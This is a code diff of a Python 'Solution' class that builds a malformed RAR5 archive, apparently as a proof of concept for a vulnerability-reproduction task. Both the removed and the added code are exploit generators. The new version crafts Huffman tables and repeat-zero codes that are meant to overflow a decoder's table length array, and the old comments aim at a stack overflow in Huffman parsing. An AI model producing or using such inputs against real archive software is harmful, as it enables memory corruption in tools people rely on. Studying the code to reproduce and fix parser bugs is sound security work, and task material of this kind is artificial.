@@ -3,83 +3,132 @@ import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # RAR5 Signature: 52 61 72 21 1A 07 01 00
+        # RAR5 Signature: Rar!\x1a\x07\x01\x00
         sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
         
-        # Main Header (Type 1)
-        # Structure: CRC(4) | Size(V) | Type(V) | Flags(V)
-        # Size = Size(Type) + Size(Flags) = 1 + 1 = 2.
-        # Data for CRC: Size(2) + Type(1) + Flags(0) -> 02 01 00
-        mh_body = b'\x02\x01\x00'
-        mh_crc = zlib.crc32(mh_body) & 0xFFFFFFFF
-        main_header = struct.pack('<I', mh_crc) + mh_body
+        # Helper for Variable Integer (VINT) encoding
+        def to_vint(n):
+            out = bytearray()
+            while True:
+                byte = n & 0x7F
+                n >>= 7
+                if n > 0:
+                    byte |= 0x80
+                    out.append(byte)
+                else:
+                    out.append(byte)
+                    break
+            return bytes(out)
+
+        # --- 1. Main Archive Header ---
+        # Type=1 (Main), Flags=0
+        main_header_content = to_vint(1) + to_vint(0)
+        mh_size_field = to_vint(len(main_header_content))
         
-        # File Header (Type 2)
-        # Header Data (File specific fields):
-        # FileFlags(V)=0: 00
-        # UnpSize(V)=1: 01
-        # Attributes(V)=0: 00
-        # Compression(V)=1 (Method 1, Window 128KB): 01
-        # HostOS(V)=0: 00
-        # NameLen(V)=1: 01
-        # Name(1)='a': 61
-        fh_specific = b'\x00\x01\x00\x01\x00\x01\x61'
+        # CRC is calculated over SizeField + Content
+        mh_crc_payload = mh_size_field + main_header_content
+        mh_crc = zlib.crc32(mh_crc_payload) & 0xFFFFFFFF
+        main_header = struct.pack('<I', mh_crc) + mh_crc_payload
         
-        # Calculate Payload Length to match ground truth 524 bytes
-        # Fixed parts: Sig(8) + MH(7) + FH_CRC(4) + FH_Body(Size1+Type1+Flags1+DS2+Spec7=12? No, see below)
-        # Base Block: Type(1) + Flags(1) + DataSize(2) + Specific(7) = 11 bytes body + 1 byte Size field = 12 bytes?
-        # Let's verify size encoding: 11 is 0x0B (1 byte).
-        # Body: 0B 02 01 EC 03 ...
-        # Total FH length = 4(CRC) + 1(Size) + 1(Type) + 1(Flags) + 2(DS) + 7(Spec) = 16 bytes?
-        # No, Body size calculation: Type(1)+Flags(1)+DataSize(2)+Spec(7) = 11.
-        # Size field value = 11. Size field size = 1.
-        # Bytes: CRC(4) + Size(1) + Body(11) = 16 bytes.
-        # Wait, my previous calculation was 17 bytes.
-        # Let's re-check `fh_body` construction below.
-        # Body: Size(0B) + Type(02) + Flags(01) + DS(EC 03) + Spec(7).
-        # Total Body Bytes: 1 + 1 + 1 + 2 + 7 = 12 bytes.
-        # CRC is over these 12 bytes.
-        # Total FH bytes = 4 + 12 = 16 bytes.
-        # Total so far: 8 + 7 + 16 = 31 bytes.
-        # Ground truth: 524. Payload = 524 - 31 = 493 bytes.
-        # Let's set DataSize to 493. 493 = 0x1ED.
-        # VarInt: 1ED -> Lo 7 bits: 0x6D | 0x80 = 0xED. Hi bits: 0x03. -> ED 03.
+        # --- 2. Compressed Payload Generation ---
+        class BitWriter:
+            def __init__(self):
+                self.bytes = bytearray()
+                self.curr = 0
+                self.bits_in_curr = 0
+            
+            def write(self, val, width):
+                # RAR5 reads bits from MSB to LSB of the byte
+                for i in range(width - 1, -1, -1):
+                    bit = (val >> i) & 1
+                    if bit:
+                        self.curr |= (1 << (7 - self.bits_in_curr))
+                    self.bits_in_curr += 1
+                    if self.bits_in_curr == 8:
+                        self.bytes.append(self.curr)
+                        self.curr = 0
+                        self.bits_in_curr = 0
+                        
+            def get_bytes(self):
+                if self.bits_in_curr > 0:
+                    self.bytes.append(self.curr)
+                return bytes(self.bytes)
+
+        bw = BitWriter()
         
-        payload_len = 493
-        ds_varint = b'\xED\x03'
+        # 2.1 KeepOldTable = 0 (1 bit)
+        bw.write(0, 1)
         
-        # Base Block
-        # Size field value: Type(1) + Flags(1) + DataSize(2) + Specific(7) = 11 (0x0B)
-        size_varint = b'\x0B'
+        # 2.2 Bit Lengths Table (20 * 4 bits)
+        # We define a Huffman table to decode the Main Table lengths.
+        # We target a specific encoding to allow us to emit RLE codes.
+        # Mapping:
+        # Sym 0  -> Length 1 -> Code '0'
+        # Sym 18 -> Length 2 -> Code '10' (Binary)
+        # Sym 18 represents "Repeat Zeroes".
         
-        # Data to CRC: Size + Type + Flags + DataSize + Specific
-        fh_body = size_varint + b'\x02\x01' + ds_varint + fh_specific
-        fh_crc = zlib.crc32(fh_body) & 0xFFFFFFFF
-        file_header = struct.pack('<I', fh_crc) + fh_body
+        # The Pre-Table has 20 symbols. We send 4 bits (nibble) for each length.
+        # Index 0: Length 1 (0001)
+        bw.write(1, 4)
+        # Indices 1..17: Length 0 (0000)
+        for _ in range(17):
+            bw.write(0, 4)
+        # Index 18: Length 2 (0010)
+        bw.write(2, 4)
+        # Index 19: Length 0 (0000)
+        bw.write(0, 4)
         
-        # Payload construction
-        # To trigger stack overflow in Huffman table parsing:
-        # 1. Provide a valid Bit Length Table (first 10 bytes).
-        #    We configure it so Code 16 (Repeat Zero) has length 1 (bit '0').
-        #    Codes 16=1, 17=2, 18=3, 19=3. All others 0.
-        #    Nibbles (20 entries, 4 bits each):
-        #    0-15: 0 -> 8 bytes of 00.
-        #    16,17: 1, 2 -> Byte 0x21.
-        #    18,19: 3, 3 -> Byte 0x33.
-        bl_table = b'\x00' * 8 + b'\x21\x33'
+        # 2.3 Main Table Data
+        # We want to overflow the Main Huffman Table Length array.
+        # The array size is typically around 306.
+        # We emit Sym 18 (Repeat Zeroes) with maximum count repeatedly.
+        # Sym 18 Code: '10' (binary 2).
+        # Count encoding for Sym 18: Read 7 bits, then add 11.
+        # Max count = 127 + 11 = 138.
+        # We write 3 sequences: 3 * 138 = 414, which is > 306, triggering overflow.
         
-        # 2. Compressed Data
-        #    We want to generate massive number of zeros to overflow buffer.
-        #    Using Code 16 (bit '0') followed by Arg (2 bits).
-        #    We choose Arg '11' (3) to get max repeat (3+3=6).
-        #    Bit pattern: 0 1 1.
-        #    Repeated 011011011...
-        #    Bytes: B6 6D DB ...
-        pattern = b'\xB6\x6D\xDB'
+        for _ in range(3):
+            bw.write(2, 2)    # Code '10'
+            bw.write(127, 7)  # Count 127 ('1111111')
+            
+        payload = bw.get_bytes()
         
-        content_len = payload_len - len(bl_table)
-        content = (pattern * (content_len // 3 + 1))[:content_len]
+        # --- 3. File Header ---
+        block_type = 2
+        block_flags = 0x0002 # Has Data Area
         
-        payload = bl_table + content
+        # File Header Specifics
+        fh_flags = 0 
+        unp_size = 1024 
+        attribs = 0
+        comp_info = 0x18 # Method 3 (Normal), 128KB dictionary
+        host_os = 0 # Windows
+        name = b'poc'
+        name_len = len(name)
         
-        return sig + main_header + file_header + payload
+        fh_specific = bytearray()
+        fh_specific.extend(to_vint(fh_flags))
+        fh_specific.extend(to_vint(unp_size))
+        fh_specific.extend(to_vint(attribs))
+        fh_specific.extend(to_vint(comp_info))
+        fh_specific.extend(to_vint(host_os))
+        fh_specific.extend(to_vint(name_len))
+        fh_specific.extend(name)
+        
+        # Block Content = Type + Flags + DataSize + Specifics
+        block_content = bytearray()
+        block_content.extend(to_vint(block_type))
+        block_content.extend(to_vint(block_flags))
+        block_content.extend(to_vint(len(payload)))
+        block_content.extend(fh_specific)
+        
+        # Block Size Field
+        block_size_field = to_vint(len(block_content))
+        
+        # CRC
+        crc_payload = block_size_field + block_content
+        block_crc = zlib.crc32(crc_payload) & 0xFFFFFFFF
+        
+        file_block = struct.pack('<I', block_crc) + crc_payload + payload
+        
+        return sig + main_header + file_block
